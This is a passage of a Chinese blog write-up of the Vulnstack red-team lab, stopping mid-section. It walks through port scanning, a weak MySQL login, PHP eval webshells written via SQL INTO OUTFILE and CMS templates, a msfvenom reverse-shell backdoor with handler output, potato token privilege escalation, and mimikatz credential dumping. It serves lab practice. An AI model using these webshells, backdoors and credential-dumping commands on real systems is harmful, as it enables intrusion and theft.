title="零、靶场介绍与下载"></a>零、靶场介绍与下载</h3><h4 id="0-靶场下载地址"><a href="#0-靶场下载地址" class="headerlink" title="0.靶场下载地址"></a>0.靶场下载地址</h4><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">靶场下载地址</a></p><p><strong>靶场介绍</strong></p><pre class="line-numbers language-none"><code class="language-none">红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。另外本次实战完全模拟ATT&amp;CK攻击链路进行搭建，开成完整闭环。后续也会搭建真实APT实战环境，从实战中成长。关于环境可以模拟出各种各样实战路线，目前给出作者实战的一套攻击实战路线如下，虚拟机所有统一密码：hongrisec@2019：一、环境搭建1.环境搭建测试2.信息收集二、漏洞利用3.漏洞搜索与利用4.后台Getshell上传技巧5.系统信息收集6.主机密码收集三、内网搜集7.内网--继续信息收集8.内网攻击姿势--信息泄露9.内网攻击姿势-MS08-067 10.内网攻击姿势-SMB远程桌面口令猜测11.内网攻击姿势-Oracle数据库TNS服务漏洞12.内网攻击姿势-RPC DCOM服务漏洞四、横向移动13.内网其它主机端口-文件读取14.内网其它主机端口-redis15.内网其它主机端口-redis Getshell16.内网其它主机端口-MySQL数据库17.内网其它主机端口-MySQL提权五、构建通道18.内网其它主机端口-代理转发六、持久控制19.域渗透-域成员信息收集20.域渗透-基础服务弱口令探测及深度利用之powershell21.域渗透-横向移动[wmi利用]22.域渗透-C2命令执行23.域渗透-利用DomainFronting实现对beacon的深度隐藏24.域渗透-域控实现与利用七、痕迹清理25、日志清理<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h3><h4 id="1-环境搭建测试"><a href="#1-环境搭建测试" class="headerlink" title="1.环境搭建测试"></a>1.环境搭建测试</h4><p>先配置靶场环境，</p><p><code>统一密码：hongrisec@2019</code>，但是有两个主机的密码是需要修改的，这里我选择修改两个server主机为了<code>@dmin123</code>。</p><p>进入问7之后发现这个负责连接外网展示web界面的主机’坏掉了’，这里需要简单地配置一下。</p><p><a href="https://troyess.com/2021/06/03/vulnstack%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98-%E4%B8%80/">vulnstack内网靶场(一)保姆级教程</a></p><p>wrwrwr我太困了，眼疼，先上床追会儿剧。</p><p>主要就是打开三个虚拟机，</p><ol><li><p>先用<code>hongrisec@2019</code>这个密码进域控虚拟机机，然后进域成员虚拟机，注意这里都是需要改密码的。</p></li><li><p>然后打开win7的虚拟机进去直接就能用<code>hongrisec@2019</code>登录，但是提示要重新启动，这时候直接选择立即重新启动。</p></li><li>重启之后配置网卡。我这里两个图，直接按我下面的这样应该就是可以的(大概)</li><li>再web服务器win7上的c盘，找到PHP study并将其打开。</li></ol><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605002015556.png" alt="虚拟网络编辑器"></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605002326199.png" alt="分别配置各个虚拟机的网络"></p><p>上面域控虚拟机名字写错了，应该是server 2008的，手抖手抖。</p><p><strong>大概情况就是下面的情况：</strong></p><div class="table-container"><table><thead><tr><th>模拟内、外网的网卡名与名下ip地址</th><th>连接该网卡的虚拟机</th></tr></thead><tbody><tr><td>VMnet1/192.168.52.0</td><td>环境里面的三个虚拟机server2008、server 2003、Windows 7都要先连接内网的网络适配器VMnet1</td></tr><tr><td>VMnet2/192.168.72.0</td><td>负责web服务的机器Windows 7和攻击机kali都要链接这个模拟外网的网络适配器VMnet2</td></tr></tbody></table></div><h4 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h4><p>模拟黑盒先试试，就是不进去win7看有没有什么服务，而是直接进入攻击机 kali里面通过扫描这种资产收集方式进行信息收集</p><p><strong>1.端口扫描</strong></p><p>因为这里已经知道只有一个外部ip(win7的ip了)，所以这里也直接可以免去对目标C段的扫描了，直接掏出诸神之眼nmap扫描。</p><p><a href="https://www.cnblogs.com/liaopeng123/p/11281516.html">nmap常见命令的使用</a></p><pre class="line-numbers language-none"><code class="language-none">nmap -T4 192.168.72.128 -p 1-65535  # 对目标主机进行全端口快速扫描<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605004340032.png" alt></p><p>这里我们扫描简单得多了，因为”网络很好”，直接可以开T4，这里也是<strong>大概两分多钟</strong>就扫描完毕了，但是实战时有时T4是不行的似乎。</p><p>想看扫描过程的话加个参数<code>-v</code>即可</p><pre class="line-numbers language-none"><code class="language-none">nmap -T4 192.168.72.128 -v -p 1-65535<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><div class="table-container"><table><thead><tr><th>端口</th><th>服务</th></tr></thead><tbody><tr><td>80</td><td>php探针</td></tr><tr><td>3306</td><td>mysql数据库</td></tr></tbody></table></div><p>然后可以使用dirsearch对80端口进行一个简单的目录扫描</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605010554845.png" alt="image-20210605010554845"></p><p>80扫描到了phpMyAdmin的服务，这里应该直接在这里连接数据库3306的。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605010800401.png" alt="PHP版本"></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605010832281.png" alt="phpMyAdmin"></p><p>外网能进行的信息收集也就这么多了。</p><h3 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h3><h4 id="3-漏洞搜索与利用"><a href="#3-漏洞搜索与利用" class="headerlink" title="3.漏洞搜索与利用"></a>3.漏洞搜索与利用</h4><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605005358760.png" alt="80端口的php study探针"></p><p>注意到最下方有个MySQL数据库的连接检测，简单测试了一下，是可以用弱口令进行爆破的，但是这个口令实在是太弱了，也没必要再上BurpSuite了。<code>用户名/root        密码/root</code></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605005633874.png" alt="弱口令爆破处"></p><p>登录之后是英文的，把语言换成中文(Simplified)</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605084538186.png" alt="/其他信息"></p><p>本来是想直接利用mysql写入shell的，但是好像是模式不对，不能写入文件。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">创建数据表导出shell，写shell到目标主机CREATE TABLE &#96;mysql&#96;.&#96;user1&#96; (&#96;content&#96; TEXT NOT NULL );INSERT INTO &#96;mysql&#96;.&#96;user1&#96; (&#96;content&#96; ) VALUES (&#39;&lt;?php @eval($_POST[x123]);?&gt;&#39;);SELECT &#96;content&#96; FROM &#96;user1&#96; INTO OUTFILE &#39;C:\\phpStudy\\WWW\\xxx.php&#39;;DROP TABLE IF EXISTS &#96;user1&#96;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605113426399.png" alt="禁止写文件"></p><p><strong>注意到还有个网站的数据库</strong></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605113549994.png" alt="image-20210605113549994"></p><h4 id="4-后台Getshell上传技巧"><a href="#4-后台Getshell上传技巧" class="headerlink" title="4.后台Getshell上传技巧"></a>4.后台Getshell上传技巧</h4><p>经典，太经典了啊</p><p><a href="https://blog.csdn.net/LK20191121/article/details/103181514">YXcms getshell</a></p><p>这里采用的是文件上传</p><p><strong>先通过刚才的数据库信息获得该站的管理员账号密码</strong></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605114122717.png" alt="看一下管理员的账号密码"></p><pre class="line-numbers language-none"><code class="language-none">admin&#x2F;168a73655bfecefdb15b14984dd2ad60admin&#x2F;949ba59abbe56e05<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605114222423.png" alt="将管理员的密码解一下md5"></p><p>登录网站管理员</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605114419482.png" alt></p><p>登不上，我人傻了，我这里有两处错误，</p><ol><li>首先是密码不是刚才解得的，还有一层hash应该是，但是我不知道怎么解，这里可以直接使用YXcms的弱口令来登入管理员，</li><li>其次就是我这个路径不对，这是一般账号登入的地方，管理员应该把member换为admin来登入即可。</li></ol><p>前台模板处可以getshell</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605115353980.png" alt></p><p>这里直接新建一个<code>eval.php</code>文件，内容写为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"m4xlmum"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605120306642.png" alt></p><p>这里我没有找到前台文件的路径，但是考虑到可以使用<code>../</code>来进行目录穿越直接将文件写入站点的根目录，进根目录发现确实已经写入了。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605120551436.png" alt="没有出现404 not found就是已经把shell写入了"></p><p>使用蚁剑连接shell</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605122429678.png" alt></p><h4 id="5-系统信息收集"><a href="#5-系统信息收集" class="headerlink" title="5.系统信息收集"></a>5.系统信息收集</h4><pre class="line-numbers language-none"><code class="language-none">(*) 基础信息当前路径: C:&#x2F;phpStudy&#x2F;WWW磁盘列表: C:D:系统信息: Windows NT STU1 6.1 build 7601 (Windows 7 Business Edition Service Pack 1) i586当前用户: Administrator(*) 输入 ashelp 查看本地命令C:\phpStudy\WWW&gt; cd C:&#x2F;phpStudy&#x2F;WWW&#x2F;C:\phpStudy\WWW&gt; whoamigod\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>连接远程桌面(rdesktop)</strong></p><p>蚁剑开一下终端，发现是域用户administrator账号的权限。这时这台主机的权限几乎就全拿到了，然后就是开一下端口方便我们进行远程连接</p><pre class="line-numbers language-none"><code class="language-none"># 开windows 3389端口的命令REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f# 关windows 3389端口的命令REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 11111111 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>下面就是<strong>连接windows远程桌面的命令</strong></p><pre class="line-numbers language-none"><code class="language-none">kali连接rdp远程桌面**命令**rdesktop -g 1440x900 -r disk:LinuxDisk&#x3D;&#x2F;root&#x2F;Downloads -u administrator -p &quot;password&quot; 192.168.72.128:3389# 如果无rdesktop工具，可用 sudo apt install rdesktop 命令安装**参数**-g    # 窗口分辨率-r    # 本地目录共享-u    # 用户名-p    # 密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="6-主机密码收集"><a href="#6-主机密码收集" class="headerlink" title="6.主机密码收集"></a>6.主机密码收集</h4><p>上面的这个系统信息没什么好收集的感觉，直接尝试能不能dump出windows主机的用户名/密码。使用msf + mimikatz</p><p>先使用msf制作一个适用于win7的后门程序，这里我直接就使用的是msf自带的payload了，没用CS的payload，一是CS和msf的联动现在还不太会，二是这个系统版本不新，也没有什么好的防御措施(例如360、卡巴斯基等等)，所以不做免杀也该也是能过的。</p><pre class="line-numbers language-none"><code class="language-none"># msf生成适用于win7的后门程序msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.72.130 LPORT&#x3D;4444 -f exe -o ~&#x2F;桌面&#x2F;shell┌──(m4xlmum㉿kali)-[~]└─$ msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.72.130 LPORT&#x3D;4444 -f exe -o ~&#x2F;桌面&#x2F;shell  [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 354 bytesFinal size of exe file: 73802 bytesSaved as: &#x2F;home&#x2F;m4xlmum&#x2F;桌面&#x2F;shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>后缀名加个<code>.exe</code>就行了，生成的时候忘记加了。然后把shell上传到win7里面(使用蚁剑的上传功能)</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605134737305.png" alt></p><p>在蚁剑中打开一个终端，切换到这个存在shell的目录下面，使用如下命令执行shell(为保证万无一失，这里先不执行，等kali监听做好了再执行)。</p><pre class="line-numbers language-none"><code class="language-none">start shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>配置攻击机的监听选项</strong></p><pre class="line-numbers language-none"><code class="language-none">msf6 &gt; use exploit&#x2F;multi&#x2F;handler [*] Using configured payload generic&#x2F;shell_reverse_tcpmsf6 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcppayload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcpmsf6 exploit(multi&#x2F;handler) &gt; show optionsModule options (exploit&#x2F;multi&#x2F;handler):   Name  Current Setting  Required  Description   ----  ---------------  --------  -----------Payload options (windows&#x2F;meterpreter&#x2F;reverse_tcp):   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)   LHOST                      yes       The listen address (an interface may be specified)   LPORT     4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Wildcard Targetmsf6 exploit(multi&#x2F;handler) &gt; set lhost 192.168.72.130lhost &#x3D;&gt; 192.168.72.130msf6 exploit(multi&#x2F;handler) &gt; run[*] Started reverse TCP handler on 192.168.72.130:4444 [*] Sending stage (175174 bytes) to 192.168.72.128[*] Meterpreter session 1 opened (192.168.72.130:4444 -&gt; 192.168.72.128:21682) at 2021-06-05 13:55:48 +0800<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我是在run之后再去蚁剑的终端里面start那个后门程序的，这时已经获得了shell的连接了，输入shell获得powershell，然后查看自己的权限。</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; shellProcess 2264 created.Channel 1 created.Microsoft Windows [�汾 6.1.7601]��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����C:\Program Files&gt;whoamiwhoamigod\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然这里是administrator，但是却并不是SYSTEM权限，这里就需要我们再提一下权限了</p><p><strong>Windows 7 权限提升</strong></p><p>提权参考<a href="https://blog.csdn.net/nzjdsds/article/details/82262830">Windows提权辅助工具使用参考文章</a></p><p>先在蚁剑的shell下生成一个Systeminfo命令的文本文档，命名为<code>win7.txt</code>。</p><pre class="line-numbers language-none"><code class="language-none">Systeminfo &gt; win7.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把这个文件拉到kali里面，然后下载<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a></p><pre class="line-numbers language-none"><code class="language-none"># 先更新一下数据库┌──(m4xlmum㉿kali)-[~&#x2F;桌面&#x2F;web&#x2F;windows权限提升]└─$ python windows-exploit-suggester.py --update                            1 ⨯[*] initiating winsploit version 3.3...[+] writing to file 2021-06-05-mssb.xls[*] done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后查看可以使用的有针对性的漏洞，但是需要注意的是，使用这个工具需要下载<code>xlrd</code>python库并且版本不能太高，我用的时候报错了，重新安装了<code>pip install xlrd==1.2.0</code>才解决了，并且要使用python2。</p><pre class="line-numbers language-none"><code class="language-none">python windows-exploit-suggester.py --database 2021-06-05-mssb.xls --systeminfo win7.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里我截取了一部分存在远程代码执行的漏洞，看看msfdb里面有没有对应的POC，从上向下找。</p><pre class="line-numbers language-none"><code class="language-none">[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;40039&#x2F;, PoC[*] [E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;39232&#x2F; -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;39233&#x2F; -- Microsoft Office &#x2F; COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC[*] [E] MS15-134: Security Update for Windows Media Center to Address Remote Code Execution (3108669) - Important[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;38911&#x2F; -- Microsoft Windows Media Center Library Parsing RCE Vulnerability aka self-executing&#39; MCL File, PoC[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;38912&#x2F; -- Microsoft Windows Media Center Link File Incorrectly Resolved Reference, PoC[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;38918&#x2F; -- Microsoft Office &#x2F; COM Object - &#39;els.dll&#39; DLL Planting (MS15-134)[*]   https:&#x2F;&#x2F;code.google.com&#x2F;p&#x2F;google-security-research&#x2F;issues&#x2F;detail?id&#x3D;514 -- Microsoft Office &#x2F; COM Object DLL Planting with els.dll[*] [E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;38968&#x2F; -- Microsoft Office &#x2F; COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;38918&#x2F; -- Microsoft Office &#x2F; COM Object els.dll DLL Planting (MS15-134), PoC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是这次不想用上面的这些漏洞，想试试msfconsole自带的一些漏洞利用工具，这里选择使用<code>post/multi/recon/local_exploit_suggester</code>，使用方法与命令如下:</p><p>漏洞利用 &amp; 权限提升</p><pre class="line-numbers language-none"><code class="language-none">msf6 exploit(multi&#x2F;handler) &gt; run[*] Started reverse TCP handler on 192.168.72.130:4444 [*] Sending stage (175174 bytes) to 192.168.72.128[*] Meterpreter session 2 opened (192.168.72.130:4444 -&gt; 192.168.72.128:22785) at 2021-06-05 15:44:09 +0800meterpreter &gt; background[*] Backgrounding session 2...msf6 exploit(multi&#x2F;handler) &gt; sessionsActive sessions&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  Id  Name  Type                  Information            Connection  --  ----  ----                  -----------            ----------  2         meterpreter x86&#x2F;wind  GOD\Administrator @ S  192.168.72.130:4444 -            ows                   TU1                    &gt; 192.168.72.128:2278                                                         5 (192.168.72.128)msf6 exploit(multi&#x2F;handler) &gt; use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggestermsf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; set session 2session &#x3D;&gt; 2msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; exploit[*] 192.168.72.128 - Collecting local exploits for x86&#x2F;windows...[*] 192.168.72.128 - 38 exploit checks are being tried...[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms10_092_schelevator: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms13_053_schlamperei: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms13_081_track_popup_menu: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms14_058_track_popup_menu: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms15_051_client_copy_image: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection_juicy: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ntusermndragover: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ppr_flatten_rec: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;tokenmagic: The target appears to be vulnerable.[*] Post module execution completedmsf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的所有exploit只试了一个，试了试漏洞<code>ms16_075</code>，但是直接使用msf的poc似乎会出错，参考<a href="https://blog.csdn.net/cj_Allen/article/details/105489922">Metasploit下利用ms16-075提权</a>，在下面这个地方<a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">下载该exploit</a></p><p><strong>ms16_075权限提升</strong></p><p>下载好上面的那个potato.exe文件之后，将这个exe文件上传至<code>c:/</code>目录下，然后执行以下命令来提权</p><pre class="line-numbers language-none"><code class="language-none">use incognito                     ：加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户)list_tokens -u    ：列出目标主机用户的可用令牌execute -cH -f c:&#x2F;potato.exe       :创建新的进程list_tokens -u :列出目标主机用户的可用令牌impersonate_token &quot;NT AUTHORITY\SYSTEM&quot; :假冒目标主机上的可用令牌# 实际上执行下面这三条命令应该就足够了use incognitoexecute -cH -f c:&#x2F;potato.exeimpersonate_token &quot;NT AUTHORITY\SYSTEM&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605163004946.png" alt="中间错误较多，不复制粘贴了"></p><p><strong>kiwi明文密码抓取</strong></p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; load kiwi[!] The &quot;kiwi&quot; extension has already been loaded.meterpreter &gt; help kiwiKiwi Commands&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;    Command                Description    -------                -----------    creds_all              Retrieve all credentials (parsed)    creds_kerberos         Retrieve Kerberos creds (parsed)    creds_livessp          Retrieve Live SSP creds    creds_msv              Retrieve LM&#x2F;NTLM creds (parsed)    creds_ssp              Retrieve SSP creds    creds_tspkg            Retrieve TsPkg creds (parsed)    creds_wdigest          Retrieve WDigest creds (parsed)    dcsync                 Retrieve user account information via DCSync (unparsed)    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync    golden_ticket_create   Create a golden kerberos ticket    kerberos_ticket_list   List all kerberos tickets (unparsed)    kerberos_ticket_purge  Purge any in-use kerberos tickets    kerberos_ticket_use    Use a kerberos ticket    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)    lsa_dump_sam           Dump LSA SAM (unparsed)    lsa_dump_secrets       Dump LSA secrets (unparsed)    password_change        Change the password&#x2F;hash of a user    wifi_list              List wifi profiles&#x2F;creds for the current user    wifi_list_shared       List shared wifi profiles&#x2F;creds (requires SYSTEM)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里应该是我环境配置的原因，直接就上管理员权限了，先加载msf的模块<code>kiwi</code>，这个模块代替了<code>mimikatz</code>模块，上面的命令为查询kiwi模块的使用方式的命令。</p><p><strong>kiwi_cmd模块，可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令即可</strong></p><p>kiwi专用的命令</p><pre class="line-numbers language-none"><code class="language-none">load kiwicreds_all<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>没dump出来，但是直接用mimikatz的话会报错，必须把当前进程迁移到64位进程中去，进程迁移使用以下命令，ps回显太多不复制了。</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; psProcess List&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; PID   PPID  Name               Arch  Session  User                          Path ---   ----  ----               ----  -------  ----                          ---- 0     0     [System Process] 4     0     System             x64   0 252   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe 308   612   slui.exe           x64   1        GOD\Administrator             C:\Windows\System32\slui.exe 332   324   csrss.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe 340   492   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe 384   324   wininit.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe 396   376   csrss.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe 432   376   winlogon.exe       x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe 492   384   services.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe 500   384   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exemeterpreter &gt; migrate 332[*] Migrating from 1196 to 2044...[*] Migration completed successfully.meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605165646907.png" alt="image-20210605165646907"></p><p>账户密码获得为</p><pre 